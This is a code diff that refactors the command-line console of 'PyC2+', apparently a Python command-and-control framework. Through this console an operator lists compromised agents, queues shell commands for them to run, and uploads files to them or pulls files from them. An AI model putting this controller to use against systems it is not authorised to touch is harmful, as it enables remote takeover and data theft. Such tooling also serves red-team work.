@@ -6,7 +6,7 @@ import threading
 
 from lib.config import agents, tasks, results, result_queues, AGENT_TIMEOUT
 
-# Colors
+# CLI colors
 RED = "\033[91m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
@@ -15,13 +15,17 @@ BOLD = "\033[1m"
 RESET = "\033[0m"
 
 
+def cprint(text, color=""):
+    print(f"{color}{text}{RESET}")
+
+
 def start_cli():
     time.sleep(1)
 
-    print(CYAN + BOLD + "\n" + "="*50)
-    print("                 PyC2+ CLI")
-    print("="*50 + RESET)
-    print(YELLOW + "Type 'help' for commands or 'exit' to quit.\n" + RESET)
+    cprint("\n" + "="*50, CYAN + BOLD)
+    cprint("                 PyC2+ CLI", CYAN + BOLD)
+    cprint("="*50 + "\n", CYAN + BOLD)
+    cprint("Type 'help' for commands or 'exit' to quit.\n", YELLOW)
 
     selected = None
     stop_live = threading.Event()
@@ -43,151 +47,140 @@ def start_cli():
             except:
                 continue
 
-            print(f"\n{YELLOW}[{entry['timestamp']}] {RESET}")
-            print(CYAN + entry["result"] + RESET)
+            cprint(f"\n[{entry['timestamp']}]", YELLOW)
+            cprint(entry["result"], CYAN)
 
     threading.Thread(target=live_thread, daemon=True).start()
 
-    # USER PROMPT
     def prompt():
         if selected:
-            return f"\n{RED}[PyC2+ | {selected}]{RESET}> "
-        return f"\n{RED}[PyC2+]{RESET}> "
+            return f"\n{RED}[PyC2+ | {selected}]{RESET}{RED}> "
+        return f"\n{RED}[PyC2+]{RESET}{RED}> "
+
+    def check_agent_selected_and_online():
+        if not selected:
+            cprint("[!] Select agent first.", RED)
+            return False
+        last_seen = agents.get(selected, {}).get("last_seen", 0)
+        if time.time() - last_seen > AGENT_TIMEOUT:
+            cprint("[!] Agent offline.", RED)
+            return False
+        return True
+
+    def handle_put(cmd):
+        if not check_agent_selected_and_online():
+            return
+
+        try:
+            _, local, remote = cmd.split(maxsplit=2)
+        except ValueError:
+            cprint("[!] Usage: put <local_path> <remote_filename>", RED)
+            return
+
+        if not os.path.isfile(local):
+            cprint("[!] Local file not found.", RED)
+            return
+
+        with open(local, "rb") as f:
+            b64 = base64.b64encode(f.read()).decode()
+
+        payload = json.dumps({"type": "put", "filename": remote, "data": b64})
+        tasks[selected].put(payload)
+        cprint(f"[+] Uploaded {local} → {remote} (queued for agent)", GREEN)
+
+    def handle_get(cmd):
+        if not check_agent_selected_and_online():
+            return
+
+        remote_path = cmd[len("get "):].strip()
+        payload = json.dumps({"type": "get", "path": remote_path})
+        tasks[selected].put(payload)
+        cprint(f"[+] Requested file: {remote_path}", GREEN)
+
+    def handle_send(cmd):
+        if not check_agent_selected_and_online():
+            return
+
+        command = cmd[len("send "):]
+        tasks[selected].put(command)
+        cprint(f"[+] Command queued for agent: {command}", GREEN)
+
+    def handle_history():
+        if not selected:
+            cprint("[!] No agent selected.", RED)
+            return
+        for e in results.get(selected, []):
+            cprint(f"\n[{e['timestamp']}]", YELLOW)
+            cprint(e["result"], CYAN)
 
     # MAIN LOOP
     while True:
         try:
             cmd = input(prompt()).strip()
         except (KeyboardInterrupt, EOFError):
-            print(f"\n{YELLOW}Exiting PyC2+ CLI...{RESET}")
+            cprint("\nExiting PyC2+ CLI...", YELLOW)
             stop_live.set()
             break
 
         if not cmd:
             continue
 
-        # HELP MENU
         if cmd == "help":
-            print(CYAN + BOLD + "\nAvailable commands:" + RESET)
-            print(f"{GREEN}  agents{RESET}                   - list all agents")
-            print(f"{GREEN}  select <id>{RESET}              - select an agent")
-            print(f"{GREEN}  send <command>{RESET}           - send shell command to agent")
-            print(f"{GREEN}  put <local> <remote>{RESET}     - upload file to agent")
-            print(f"{GREEN}  get <remote_path>{RESET}        - download file from agent")
-            print(f"{GREEN}  history{RESET}                  - show stored results for selected agent")
-            print(f"{GREEN}  exit{RESET}                     - quit CLI\n")
+            cprint("\nAvailable commands:", CYAN + BOLD)
+            cprint("  agents                   - list all agents", GREEN)
+            cprint("  select <id>              - select an agent", GREEN)
+            cprint("  send <command>           - send shell command to agent", GREEN)
+            cprint("  put <local> <remote>     - upload file to agent", GREEN)
+            cprint("  get <remote_path>        - download file from agent", GREEN)
+            cprint("  history                  - show stored results for selected agent", GREEN)
+            cprint("  exit                     - quit CLI\n", GREEN)
             continue
 
-        # LIST AGENTS
         if cmd == "agents":
             live = [
                 aid for aid, info in agents.items()
-                if time.time() - info["last_seen"] <= AGENT_TIMEOUT
+                if time.time() - info.get("last_seen", 0) <= AGENT_TIMEOUT
             ]
-
             if not live:
-                print(RED + "[!] No agents connected." + RESET)
+                cprint("[!] No agents connected.", RED)
             else:
-                print(CYAN + "\nConnected agents:" + RESET)
+                cprint("\nConnected agents:", CYAN)
                 for a in live:
-                    print(f"{YELLOW}  → {a}{RESET}")
+                    cprint(f"  → {a}", YELLOW)
             continue
 
-        # SELECT AGENT
         if cmd.startswith("select "):
-            aid = cmd.split()[1]
-            if aid in agents and time.time() - agents[aid]["last_seen"] <= AGENT_TIMEOUT:
+            aid = cmd.split(maxsplit=1)[1]
+            last_seen = agents.get(aid, {}).get("last_seen", 0)
+            if aid in agents and time.time() - last_seen <= AGENT_TIMEOUT:
                 selected = aid
-                print(f"{GREEN}[+] Selected agent: {aid}{RESET}")
-
-                # Clear existing queued live-output
+                cprint(f"[+] Selected agent: {aid}", GREEN)
+                # Clear queued live output
                 with result_queues[aid].mutex:
                     result_queues[aid].queue.clear()
-
             else:
-                print(RED + "[!] Invalid or offline agent." + RESET)
+                cprint("[!] Invalid or offline agent.", RED)
             continue
 
-        # PUT FILE
         if cmd.startswith("put "):
-            if not selected:
-                print(RED + "[!] Select an agent first." + RESET)
-                continue
-
-            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
-                print(RED + "[!] Agent offline." + RESET)
-                continue
-
-            parts = cmd.split(" ")
-            if len(parts) < 3:
-                print(RED + "[!] Usage: put <local_path> <remote_filename>" + RESET)
-                continue
-
-            local = parts[1]
-            remote = parts[2]
-
-            if not os.path.isfile(local):
-                print(RED + "[!] Local file not found." + RESET)
-                continue
-
-            with open(local, "rb") as f:
-                b64 = base64.b64encode(f.read()).decode()
-
-            payload = json.dumps({"type": "put", "filename": remote, "data": b64})
-            tasks[selected].put(payload)
-
-            print(f"{GREEN}[+] Uploaded {local} → {remote} (queued for agent){RESET}")
+            handle_put(cmd)
             continue
 
-        # GET FILE
         if cmd.startswith("get "):
-            if not selected:
-                print(RED + "[!] Select an agent first." + RESET)
-                continue
-
-            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
-                print(RED + "[!] Agent offline." + RESET)
-                continue
-
-            remote_path = cmd[len("get "):].strip()
-
-            payload = json.dumps({"type": "get", "path": remote_path})
-            tasks[selected].put(payload)
-
-            print(f"{GREEN}[+] Requested file: {remote_path}{RESET}")
+            handle_get(cmd)
             continue
 
-        # SEND COMMAND
         if cmd.startswith("send "):
-            if not selected:
-                print(RED + "[!] Select agent first." + RESET)
-                continue
-
-            if time.time() - agents[selected]["last_seen"] > AGENT_TIMEOUT:
-                print(RED + "[!] Agent offline." + RESET)
-                continue
-
-            command = cmd[5:]
-            tasks[selected].put(command)
-            print(f"{GREEN}[+] Command queued for agent: {command}{RESET}")
+            handle_send(cmd)
             continue
 
-        # HISTORY
         if cmd == "history":
-            if not selected:
-                print(RED + "[!] No agent selected." + RESET)
-                continue
-
-            for e in results[selected]:
-                print(f"\n{YELLOW}[{e['timestamp']}] {RESET}")
-                print(CYAN + e["result"] + RESET)
+            handle_history()
             continue
 
-        # EXIT
         if cmd == "exit":
-            print(YELLOW + "Leaving CLI..." + RESET)
+            cprint("Leaving CLI...", YELLOW)
             stop_live.set()
             break
 
-        # UNKNOWN COMMAND
-        print(RED + "[!] Unknown command." + RESET)
+        cprint("[!] Unknown command.", RED)
